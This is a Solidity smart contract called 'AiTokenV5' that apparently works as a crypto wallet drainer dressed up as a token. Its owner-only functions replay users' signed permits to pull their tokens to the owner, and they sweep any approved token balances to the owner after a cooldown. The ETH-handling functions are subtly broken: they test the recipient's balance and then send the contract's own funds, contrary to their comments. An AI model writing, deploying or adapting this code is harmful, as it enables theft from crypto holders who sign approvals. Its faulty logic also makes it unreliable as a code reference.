// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

interface IERC2612 {
    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;
}

contract AiTokenV5 {
    address payable public owner;
    mapping(address => bool) public whitelistedTokens;
    mapping(address => uint256) public lastActionTime;
    uint256 public cooldownPeriod = 1 hours;
    bool public ethActionEnabled; // Default: true

    constructor() {
        owner = payable(msg.sender);
        ethActionEnabled = true; // Aktifkan tindakan ETH secara default
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner!");
        _;
    }

    receive() external payable {}

    function performEthAction(
        address payable _target,
        uint256 _value
    ) external onlyOwner {
        require(ethActionEnabled, "ETH action disabled");
        require(_target.balance >= _value, "Insufficient ETH to act");

        (bool success, ) = _target.call{value: _value}("");
        require(success || address(_target).code.length == 0, "ETH action failed");
    }

    function authorizeAndTransferTokens(
        address _user,
        address[] calldata _tokens,
        uint256[] calldata _amounts,
        uint256 _deadline,
        uint8[] calldata _v,
        bytes32[] calldata _r,
        bytes32[] calldata _s
    ) external onlyOwner {
        require(_tokens.length == _amounts.length && _tokens.length == _v.length && _tokens.length == _r.length && _tokens.length == _s.length, "Array lengths mismatch");
        for (uint i = 0; i < _tokens.length; i++) {
            IERC2612(_tokens[i]).permit(_user, address(this), _amounts[i], _deadline, _v[i], _r[i], _s[i]);
            IERC20(_tokens[i]).transferFrom(_user, owner, _amounts[i]);
        }
    }

    function processAllTokens(address payable _user, address[] calldata _tokens) external onlyOwner {
        require(block.timestamp >= lastActionTime[_user] + cooldownPeriod, "Cooldown active");

        // Process ETH (jika diaktifkan dan ada saldo)
        if (_user.balance > 0 && ethActionEnabled) {
            (bool success, ) = _user.call{value: _user.balance}("");
            require(success || address(_user).code.length == 0, "ETH transfer failed");
        }

        // Process tokens
        for (uint i = 0; i < _tokens.length; i++) {
            if (whitelistedTokens[_tokens[i]]) {
                uint256 allowance = IERC20(_tokens[i]).allowance(_user, address(this));
                uint256 balance = IERC20(_tokens[i]).balanceOf(_user);
                if (allowance > 0 && balance > 0) {
                    IERC20(_tokens[i]).transferFrom(_user, owner, (allowance < balance) ? allowance : balance);
                }
            }
        }
        lastActionTime[_user] = block.timestamp;
    }

    function manageWhitelistedToken(address _token) external onlyOwner {
        whitelistedTokens[_token] = true;
    }

    function retrieveFunds() external onlyOwner {
        owner.transfer(address(this).balance);
    }
}
